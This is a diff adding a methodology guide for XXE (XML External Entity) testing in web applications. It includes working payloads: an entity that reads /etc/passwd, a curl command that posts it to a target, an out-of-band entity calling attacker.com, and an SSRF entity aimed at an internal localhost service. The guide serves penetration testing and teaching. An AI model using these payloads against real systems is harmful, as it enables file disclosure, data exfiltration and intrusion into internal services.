@@ -1,0 +1,94 @@
+---
+title: Comprehensive Guide to XXE Testing Methodology
+description: Explore a step-by-step approach to testing and escalating XXE vulnerabilities
+  in web apps, including attack surface mapping and OOB exploitation.
+keywords:
+- XXE testing
+- XML External Entity
+- XXE vulnerabilities
+- OOB exploitation
+- attack surface mapping
+- XML parser enumeration
+- file disclosure
+- XXE escalation
+- SSRF via XXE
+---
+
+# XXE Testing Methodology
+
+## Context
+
+In this article, we will equip you with a structured, operational methodology for manually testing and escalating XML External Entity (XXE) vulnerabilities in web applications. This guide assumes familiarity with XML structure, entity declarations, DTD processing, and basic XXE injection techniques. 
+
+## Theory
+
+### Mapping the XML Attack Surface
+
+Identifying the attack surface is crucial for effectively testing XXE vulnerabilities. The attack surface includes all application endpoints that accept XML inputs, such as file uploads, API endpoints, SOAP interfaces, and SAML processors. Start by enumerating these endpoints, analyzing request and response patterns, and locating XML parsing logic. This foundational step ensures you target all possible XML entry points within the application.
+
+### Parser Enumeration and Behavior Analysis
+
+Understanding the XML parser type and configuration is essential to assess the exploitability of XXE. Different parsers have varying support for external entities and DTD processing, which can influence the feasibility of an XXE exploit. Start by injecting benign XML entities and observing error messages or parser responses. This technique helps infer the backend parser type and its configuration, guiding subsequent attack vectors.
+
+### XXE Testing Workflow and Escalation Paths
+
+A structured workflow is fundamental for efficient XXE testing and escalation. Begin with basic entity injection attempts. If successful, escalate to more sensitive actions like file disclosure, Server-Side Request Forgery (SSRF), and Out-of-Band (OOB) data exfiltration. The potential for escalation largely depends on the parser configuration and network egress controls, and recognizing these conditions allows attackers to choose optimal techniques.
+
+### Blind and Out-of-Band (OOB) XXE Methodology
+
+In cases where there is no direct response from the server, or blind XXE, Out-of-Band channels become pivotal. Blind XXE techniques utilize DNS, HTTP, or FTP callbacks to confirm and extract data, bypassing direct interaction with the target. Setting up an OOB channel involves configuring an external server to capture these callbacks, thus confirming XXE execution remotely.
+
+## Practice
+
+### Manual XXE Testing Workflow
+
+- **Craft XML Payload**: Create an XML file with a payload designed to disclose sensitive information.
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <foo>&xxe;</foo>
+    ```
+
+- **Execute Payload**: Send the crafted XML payload to the target endpoint using a tool like `curl`.
+    ```bash
+    curl -X POST -H 'Content-Type: application/xml' --data-binary @payload.xml https://target/app/upload
+    ```
+
+- **Verify Response**: Check the server's response for the contents of sensitive files such as `/etc/passwd`.
+    ```
+    (Expected Response Example)
+    Response contains contents of /etc/passwd
+    ```
+
+### Blind XXE with OOB Data Exfiltration
+
+- **Initiate OOB Callback**: Use an XML payload to trigger an out-of-band HTTP request to an attacker-controlled server.
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe; ]>
+    <foo>bar</foo>
+    ```
+
+- **Monitor for Incoming Requests**: Observe the server logs on `attacker.com` for incoming requests, which indicate successful XXE execution via the OOB channel.
+
+### XXE Escalation to SSRF
+
+- **Send SSRF Payload**: Attempt to leverage XXE to conduct SSRF and access internal services.
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/internal"> ]>
+    <foo>&xxe;</foo>
+    ```
+
+- **Analyze Response**: Inspect the server's response for any data or error messages indicating internal service access.
+    ```
+    (Expected Response Example)
+    Response contains internal service data or error message.
+    ```
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **Responder**
+- **tcpdump** 
